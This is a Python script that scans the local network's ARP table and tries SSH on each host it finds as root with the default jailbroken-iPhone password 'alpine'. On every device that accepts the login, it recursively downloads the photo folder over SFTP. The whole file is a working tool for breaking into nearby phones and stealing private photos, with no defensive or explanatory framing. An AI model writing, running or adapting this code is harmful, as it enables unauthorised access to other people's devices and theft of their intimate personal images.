import paramiko
import subprocess
import re
import os
import sys
import socket
from paramiko.ssh_exception import SSHException
from stat import S_ISDIR

client = paramiko.SSHClient()
USERNAME = "root"
PASS = "alpine"
REMOTE = '/private/var/mobile/Media/DCIM/100APPLE/'
HOME = '/Users/cbass/Downloads/dsd/'

arpScanResult = str(subprocess.run(['arp', '-a'], stdout=subprocess.PIPE))
ipList = re.findall(re.compile('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'), arpScanResult)


def looper(i):
    print("Connecting to "+ipList[i])
    client.load_system_host_keys()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(ipList[i], username=USERNAME, password=PASS, timeout=5)
        download_dir(REMOTE, HOME)
    except paramiko.AuthenticationException:
        print("We had an authentication exception!")
        shell = None
        if(len(ipList)-1==i):
            print("done")
            sys.exit(1)
        looper(i+1)
    except socket.timeout:
        print("socket timeout")
        if(len(ipList)-1==i):
            print("done")
            sys.exit(1)
        looper(i+1);
        pass
    except (SSHException, OSError) as error:
        print("error")
        if(len(ipList)-1==i):
            print("done")
            sys.exit(1)
        looper(i+1);
        pass


def download_dir(remote_dir, local_dir):
    print("CONNECTED")
    ftp = client.open_sftp()
    os.path.exists(local_dir) or os.makedirs(local_dir)
    dir_items = ftp.listdir_attr(remote_dir)
    for item in dir_items:
        remote_path = remote_dir + '/' + item.filename
        local_path = os.path.join(local_dir, item.filename)
        if S_ISDIR(item.st_mode):
            download_dir(remote_path, local_path)
        else:
            ftp.get(remote_path, local_path)
looper(0)
